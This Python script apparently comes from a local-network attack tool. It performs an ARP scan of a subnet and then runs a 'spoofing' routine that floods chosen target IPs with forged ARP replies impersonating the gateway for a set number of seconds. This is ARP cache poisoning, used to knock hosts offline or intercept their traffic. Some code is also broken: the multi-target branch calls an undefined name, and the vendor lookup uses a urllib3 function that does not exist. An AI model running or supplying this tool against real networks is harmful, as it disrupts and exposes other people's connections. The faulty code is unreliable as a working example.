# -*- coding: utf-8 -*-

import logging
import time
import datetime
import sys
from scapy.all import srp, Ether, ARP, conf, send
import urllib3 as urllib

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END ,WARNING = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m', '\033[93m'

def scanning(iface, ips):

    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    fancyDisplay("\n[*] Scanning ...\n")
    start_scan = datetime.datetime.now()
    conf.verb = 0
    try:
        ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = ips),
            iface=iface, timeout=2, inter=0.1)

    except Exception as Error:
        fancyDisplay("[!] No such device : " + iface )
        fancyDisplay('[!] Or')
        fancyDisplay("[!] Range of IP not known : " + ips)
        exit(0)

    try:
        for s,r in ans:
            dstmac = (r[Ether].src)
            vendor = resolveMac(dstmac)
            print(r.sprintf(r"%Ether.src% - %ARP.psrc%" + "   " + vendor))
    except Exception as Err:
        fancyDisplay(Err)

    stop_scan = datetime.datetime.now()
    fancyDisplay("\n[*] Scan completed")
    time_scan = stop_scan - start_scan
    fancyDisplay("[*] Scan duration : " + str(time_scan))


def resolveMac(mac):
    try:
        url = "http://api.macvendors.com/"+str(mac)
        response = urllib.urlopen(url)
        vendor = response.read()
    except:
        vendor = "N/A"

    return vendor

def spoofing(attackMode, downTime):
    target = ['None']

    if attackMode == 1:
        fancyDisplay('choose 1 ip')
        newtarget = input('')
        target.append(newtarget)
    if attackMode == 2:
        fancyDisplay('choose multiple ip (separate with ,)')
        newtarget(input(""))
        for t in newtarget.split(','):
            target.append(t)

    fancyDisplay('Enter the Gateway ip :')
    Gateway = input("")
    now = 0

    while now < int(downTime):
        for i in target:
            if i != 'None':
                monArp = (ARP(psrc=Gateway, pdst=i, hwsrc='AA:94:c2:db:f2:22', op=2))  # Spoof mac enable
                send(monArp)

        now = now + 1
        time.sleep(1)
    fancyDisplay('fin')

def fancyDisplay(buffer, color = WHITE):
    sys.stdout.write(color)
    for i in buffer:
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.02)
    sys.stdout.write(WHITE)